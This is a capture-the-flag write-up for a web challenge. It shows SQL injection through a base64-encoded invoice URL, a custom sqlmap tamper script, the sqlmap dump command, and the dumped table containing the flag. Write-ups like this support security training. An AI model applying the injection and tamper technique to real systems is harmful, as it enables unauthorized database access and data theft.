# Stonks Street Journal

## Solution

After signing up on the website, we can view our invoice. The invoice URL appears to be in the format `/legacy_invoice_system/BASE64_ENCODED_STRING`.

This base64-encoded string decodes to `USERNAME-YEAR-MONTH-DAY`

Adding a `'` to the back of the username yielded an SQL error:

```
syntax error at or near "2021"
LINE 1: ...riber WHERE username='zeyu2001'' AND signup_date='2021-11-27...
                                                             ^
```

It appears that the input string is split into the username and signup date, and both are passed into the SQL query without sanitization.

We can use a custom SQLMap tamper script that appends the payload to the back of the signup date, and then base64-encodes the entire input string before passing it into the custom injection point at `GET /legacy_invoice_system/*`

```python
import base64
from lib.core.enums import PRIORITY

# Define which is the order of application of tamper scripts against the payload
__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):

    retVal = base64.b64encode(('zeyu2001-2021-11-27' + payload).encode()).decode()
    
    return retVal
```

Running `sqlmap -r invoice.req --tamper tamper.py --threads 10 -T news_article --dump`, we can dump the database which contains the flag.

```
Database: public
Table: news_article
[4 entries]
+----+---------------------------------------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------+-------------------------------+
| id | text                                              | headline                                                                                                                                              | publish_time                  |
+----+---------------------------------------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------+-------------------------------+
| 1  | My most favourite flag was: CSR{welc0me_0n_b0ard} | Flags are sometimes hard to find, but always beautiful                                                                                                | 2021-11-26 08:33:33.159482+00 |
| 2  | <blank>                                           | Elin [Nordegren] said I was obsessed with golf, but when I started sleeping with other women, that wasn’t good enough either.                         | 2021-11-26 08:33:33.166128+00 |
| 3  | <blank>                                           | Struggling to stay on their feet as they stood outside their assigned polling place, the nine members of the U.S. Supreme Court reportedly            | 2021-11-26 08:33:33.16646+00  |
| 4  | <blank>                                           | Former U.S. secretary of defense Donald Rumsfeld passed away Wednesday at 88 years old, sources confirmed, and is survived by 1 million fewer Iraqis. | 2021-11-26 08:33:33.166761+00 |
+----+---------------------------------------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------+-------------------------------+
```
